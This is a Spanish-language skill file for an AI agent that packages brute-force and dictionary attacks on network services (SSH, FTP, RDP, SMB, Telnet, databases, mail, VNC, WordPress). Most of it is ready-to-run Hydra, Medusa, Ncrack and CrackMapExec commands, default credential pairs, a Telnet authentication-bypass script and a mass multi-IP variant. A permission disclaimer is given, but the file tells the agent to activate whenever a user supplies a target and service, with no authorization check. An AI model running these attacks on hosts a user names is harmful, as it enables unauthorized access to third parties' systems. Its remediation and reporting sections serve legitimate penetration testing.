## Brute

### Esta SKILL.md tiene que usarse con estos repositorios de Script

https://github.com/hackingyseguridad/brute

https://github.com/hackingyseguridad/diccionarios

SKILL: brute-pentest — Ataques de Diccionario y Fuerza Bruta sobre Servicios de Red

Descripción

Esta skill cubre la ejecución de pruebas de concepto (POC) de ataques de diccionario y explotación de vulnerabilidades de autenticación por fuerza bruta sobre servicios de red activos, dado un objetivo (IP o FQDN). Integra el repositorio de subrutinas hackingyseguridad/brute con herramientas nativas de Kali Linux (Hydra, Medusa, Ncrack, Nmap, CrackMapExec, etc.) y diccionarios de hackingyseguridad/diccionarios.

Uso exclusivo en entornos autorizados. Requiere permiso escrito del propietario del sistema objetivo.


Activación (triggers)

Activar esta skill SIEMPRE que el usuario mencione cualquiera de los siguientes términos o contextos:


Fuerza bruta, brute force, ataque de diccionario, password spray, credential stuffing
Autenticación débil, credenciales por defecto, login débil
Servicios objetivo: SSH, FTP, HTTP/HTTPS, RDP, SMB, Telnet, MySQL, MSSQL, PostgreSQL, SMTP, POP3, IMAP, VNC, SIP, IKE, RPC, RSH, WordPress
Scripts del repo: brutessh.sh, bruteftp.sh, brutehttp.sh, bruterdp.sh, brutesmb.sh, brutetelnet.sh, brutemysql.sh, etc.
Frases: "comprueba credenciales en", "testea autenticación en", "intenta acceso a", "¿acepta credenciales por defecto?", "wordlist contra", "hydra contra", "medusa contra"
El usuario proporciona una IP/FQDN + nombre de servicio + solicita prueba de autenticación



Prerequisitos del entorno

Instalación del repositorio

bash# Clonar repositorio de scripts
git clone https://github.com/hackingyseguridad/brute.git /opt/brute
cd /opt/brute && chmod +x *.sh && bash instalar.sh

# Clonar diccionarios
git clone https://github.com/hackingyseguridad/diccionarios.git /opt/diccionarios

Herramientas requeridas (Kali Linux — preinstaladas)

HerramientaUso principalhydraMotor principal multi-protocolomedusaAlternativa paralela a HydrancrackFuerza bruta rápida (RDP, SSH)nmapVerificación de servicio activocrackmapexec / netexecSMB, MSSQL, WinRMwpscanWordPresscurlHTTP Basic Auth / formulariossshpassSSH en scriptsftp / lftpFTP nativo


Flujo de trabajo estándar

1. Verificar servicio activo  →  nmap -sV -p PUERTO IP
2. Seleccionar herramienta    →  según protocolo (tabla abajo)
3. Elegir diccionario         →  usuarios + contraseñas
4. Ejecutar POC               →  comando de ataque
5. Capturar evidencia         →  stdout + log
6. Documentar hallazgo        →  credencial válida / servicio protegido


Tabla de servicios y comandos POC

SSH (puerto 22)

Verificación previa:

bashnmap -sV -p 22 <IP>

Hydra (recomendado):

bashhydra -L /opt/diccionarios/usuarios.txt -P /opt/diccionarios/passwords.txt \
  ssh://<IP> -t 4 -V -o /tmp/resultado_ssh.txt

Script repo:

bashbash /opt/brute/brutessh.sh <IP>
bash /opt/brute/brutessh2.sh <IP>   # variante con timeout
bash /opt/brute/brutesshauto.sh <IP> # automatizado con detección

Medusa (alternativa):

bashmedusa -h <IP> -U /opt/diccionarios/usuarios.txt \
  -P /opt/diccionarios/passwords.txt -M ssh -t 4

Credenciales por defecto a probar: root:root, root:toor, admin:admin, pi:raspberry


FTP (puerto 21)

Verificación previa:

bashnmap -sV -p 21 <IP>
# Probar acceso anónimo
ftp <IP>  # login: anonymous  pass: anonymous

Hydra:

bashhydra -L /opt/diccionarios/usuarios.txt -P /opt/diccionarios/passwords.txt \
  ftp://<IP> -t 8 -V -o /tmp/resultado_ftp.txt

Scripts repo:

bashbash /opt/brute/bruteftp.sh <IP>
bash /opt/brute/bruteftp2.sh <IP>
bash /opt/brute/bruteftp3.sh <IP>

Detectar FTP anónimo:

bashnmap -sV --script ftp-anon -p 21 <IP>


HTTP / HTTPS — Login Form (puerto 80/443/8080)

Verificación previa:

bashnmap -sV -p 80,443,8080 <IP>
curl -I http://<IP>/admin/

Hydra — formulario POST:

bashhydra -L /opt/diccionarios/usuarios.txt -P /opt/diccionarios/passwords.txt \
  <IP> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" \
  -V -o /tmp/resultado_http.txt

Hydra — HTTP Basic Auth:

bashhydra -L /opt/diccionarios/usuarios.txt -P /opt/diccionarios/passwords.txt \
  http-get://<IP>/admin/ -V

Scripts repo:

bashbash /opt/brute/brutehttp.sh <IP>
bash /opt/brute/brutehttp1.sh <IP>   # Basic Auth
bash /opt/brute/brutehttp2.sh <IP>   # POST form
bash /opt/brute/brutehttp3.sh <IP>   # digest auth
bash /opt/brute/authbasic.sh <IP>    # curl Basic Auth

Base64 decode de cabeceras:

bashbash /opt/brute/base64.sh            # decodificador de credenciales base64


RDP — Remote Desktop (puerto 3389)

Verificación previa:

bashnmap -sV -p 3389 <IP>

Hydra:

bashhydra -L /opt/diccionarios/usuarios.txt -P /opt/diccionarios/passwords.txt \
  rdp://<IP> -t 1 -V -o /tmp/resultado_rdp.txt

Ncrack (más estable para RDP):

bashncrack -vv --user Administrator -P /opt/diccionarios/passwords.txt \
  rdp://<IP>

Scripts repo:

bashbash /opt/brute/bruterdp.sh <IP>
bash /opt/brute/bruterdp2.sh <IP>


SMB / Samba (puerto 445)

Verificación previa:

bashnmap -sV -p 445 <IP>
nmap --script smb-enum-users -p 445 <IP>

CrackMapExec / NetExec:

bashcrackmapexec smb <IP> -u /opt/diccionarios/usuarios.txt \
  -p /opt/diccionarios/passwords.txt --continue-on-success
# o con netexec (versión moderna):
netexec smb <IP> -u /opt/diccionarios/usuarios.txt \
  -p /opt/diccionarios/passwords.txt

Hydra:

bashhydra -L /opt/diccionarios/usuarios.txt -P /opt/diccionarios/passwords.txt \
  smb://<IP> -V

Scripts repo:

bashbash /opt/brute/brutesmb.sh <IP>
bash /opt/brute/brutesmb2.sh <IP>


Telnet (puerto 23)

Verificación previa:

bashnmap -sV -p 23 <IP>

Hydra:

bashhydra -L /opt/diccionarios/usuarios.txt -P /opt/diccionarios/passwords.txt \
  telnet://<IP> -t 4 -V -o /tmp/resultado_telnet.txt

Bypass / scripts:

bashbash /opt/brute/brutetelnet.sh <IP>
bash /opt/brute/brutetelnet2.sh <IP>
python3 /opt/brute/telnetbypass.py <IP>    # bypass de autenticación
bash /opt/brute/telnetbypass2.sh <IP>


MySQL (puerto 3306)

Verificación previa:

bashnmap -sV -p 3306 <IP>

Hydra:

bashhydra -L /opt/diccionarios/usuarios.txt -P /opt/diccionarios/passwords.txt \
  mysql://<IP> -t 4 -V -o /tmp/resultado_mysql.txt

Scripts repo:

bashbash /opt/brute/brutemysql.sh <IP>
bash /opt/brute/brutemysql2.sh <IP>

Credenciales por defecto: root: (sin contraseña), root:root, root:mysql


MSSQL — Microsoft SQL Server (puerto 1433)

Hydra:

bashhydra -L /opt/diccionarios/usuarios.txt -P /opt/diccionarios/passwords.txt \
  mssql://<IP> -t 4 -V

CrackMapExec:

bashcrackmapexec mssql <IP> -u sa -p /opt/diccionarios/passwords.txt

Script repo:

bashbash /opt/brute/brutems-sql.sh <IP>


PostgreSQL (puerto 5432)

Hydra:

bashhydra -L /opt/diccionarios/usuarios.txt -P /opt/diccionarios/passwords.txt \
  postgres://<IP> -t 4 -V

Script repo:

bashbash /opt/brute/brutepostgresql.sh <IP>

Credenciales por defecto: postgres:postgres, postgres: (sin contraseña)


SMTP (puerto 25 / 587)

Verificación previa:

bashnmap -sV -p 25,587 <IP>
nmap --script smtp-enum-users -p 25 <IP>

Hydra:

bashhydra -L /opt/diccionarios/usuarios.txt -P /opt/diccionarios/passwords.txt \
  smtp://<IP> -t 4 -V -S -o /tmp/resultado_smtp.txt

Scripts repo:

bashbash /opt/brute/brutesmtp.sh <IP>
bash /opt/brute/brutesmtp2.sh <IP>


POP3 (puerto 110 / 995)

Hydra:

bashhydra -L /opt/diccionarios/usuarios.txt -P /opt/diccionarios/passwords.txt \
  pop3://<IP> -t 4 -V -o /tmp/resultado_pop3.txt

Scripts repo:

bashbash /opt/brute/brutepop3.sh <IP>
bash /opt/brute/brutepop3b.sh <IP>


IMAP (puerto 143 / 993)

Hydra:

bashhydra -L /opt/diccionarios/usuarios.txt -P /opt/diccionarios/passwords.txt \
  imap://<IP> -t 4 -V

Script repo:

bashbash /opt/brute/bruteimap.sh <IP>


VNC (puerto 5900)

Verificación previa:

bashnmap -sV -p 5900 <IP>

Hydra:

bashhydra -P /opt/diccionarios/passwords.txt vnc://<IP> -t 4 -V

Script repo:

bashbash /opt/brute/brutevnc.sh <IP>


SIP / VoIP (puerto 5060)

Hydra:

bashhydra -L /opt/diccionarios/usuarios.txt -P /opt/diccionarios/passwords.txt \
  sip://<IP> -t 4 -V

Script repo:

bashbash /opt/brute/brutesip.sh <IP>


IKE / VPN (puerto 500 UDP)

Script repo:

bashbash /opt/brute/bruteike.sh <IP>


RPC / RPCBind (puerto 111 / 135)

Script repo:

bashbash /opt/brute/bruterpc.sh <IP>


RSH — Remote Shell (puerto 514)

Script repo:

bashbash /opt/brute/brutersh.sh <IP>


WordPress (HTTP/HTTPS)

WPScan (recomendado):

bashwpscan --url http://<IP>/ -U /opt/diccionarios/usuarios.txt \
  -P /opt/diccionarios/passwords.txt --max-threads 5

Script repo:

bashbash /opt/brute/brutewordpress.sh <IP>

Hydra — endpoint wp-login.php:

bashhydra -L /opt/diccionarios/usuarios.txt -P /opt/diccionarios/passwords.txt \
  <IP> http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect" -V


Gestión de diccionarios

Diccionarios incluidos en el repo hackingyseguridad

bashls /opt/diccionarios/
# Incluye: usuarios.txt, passwords.txt, rockyou_top10000.txt, etc.

Scripts auxiliares del repo brute

bashbash /opt/brute/claves.sh            # genera lista de claves comunes
bash /opt/brute/generaclaves.sh      # genera diccionario personalizado
bash /opt/brute/actualizar.sh        # actualiza scripts del repo

Diccionarios externos recomendados

bash# SecLists (preinstalado en Kali)
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt
/usr/share/seclists/Usernames/top-usernames-shortlist.txt

# RockYou (preinstalado en Kali)
/usr/share/wordlists/rockyou.txt.gz
gunzip /usr/share/wordlists/rockyou.txt.gz


Reconocimiento previo al ataque (fase recomendada)

bash# Escaneo de todos los servicios de autenticación comunes
nmap -sV -p 21,22,23,25,80,110,143,443,445,1433,3306,3389,5432,5900,5060 \
  --open -T4 <IP> -oN /tmp/servicios_activos.txt

# Detección de versiones vulnerables
nmap -sV --script banner -p 21,22,23,80,443 <IP>

# Credenciales por defecto — scripts NSE
nmap --script auth -p 21,22,23,80,3306 <IP>


Tipos de ataque cubiertos

TipoDescripciónHerramientaDiccionario directoLista de usuarios + lista de passwordsHydra, MedusaFuerza bruta inversaPassword fija + múltiples usuarios (password spray)Hydra -l fijoCredenciales por defectoPares conocidos (admin:admin, root:root)Scripts .sh del repoEnumeración de usuariosIdentificar usuarios válidos antes del ataqueNmap NSE, smtp-user-enumBypass de autenticaciónTelnet/HTTP sin credenciales válidastelnetbypass.pyMasivo / distribuidoMúltiples IPs objetivobrutesshmasivo.sh


Documentación de evidencias

Cada POC debe capturar:

bash# Guardar salida con timestamp
hydra ... -o /tmp/brute_$(date +%Y%m%d_%H%M%S)_<SERVICIO>_<IP>.txt

# Ejemplo de hallazgo positivo a documentar:
# [22][ssh] host: 192.168.1.10   login: admin   password: password123

# Screenshot / captura adicional
script -a /tmp/sesion_pentest_$(date +%Y%m%d).log

Campos de hallazgo para informe

Servicio afectado : SSH / FTP / RDP / ...
Puerto            : 22 / 21 / 3389 / ...
IP objetivo       : x.x.x.x
Usuario válido    : <user>
Contraseña        : <pass>
Herramienta usada : Hydra / Medusa / Script
Comando ejecutado : hydra -L ... 
Timestamp         : YYYY-MM-DD HH:MM:SS
CVSS v3.1 base    : 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) — credencial expuesta
CWE               : CWE-307 (Improper Restriction of Excessive Authentication Attempts)


Remediación recomendada (para informe)

ControlImplementaciónBloqueo por intentos fallidosfail2ban, account lockout policyMFA / 2FATOTP, hardware tokenContraseñas robustasMínimo 12 caracteres, complejidad altaCambio de credenciales por defectoObligatorio en instalaciónRestricción de acceso por IPFirewall / ACL a servicios críticosMonitorizaciónSIEM, alertas en intentos múltiples fallidosDeshabilitar servicios innecesariosTelnet → SSH, FTP → SFTP


Referencias


Repositorio principal: https://github.com/hackingyseguridad/brute
Diccionarios: https://github.com/hackingyseguridad/diccionarios
Referencia: http://www.hackingyseguridad.com
OWASP Testing Guide — OTG-AUTHN-003 (Testing for Weak Lock Out Mechanism)
CWE-307: Improper Restriction of Excessive Authentication Attempts
CWE-521: Weak Password Requirements
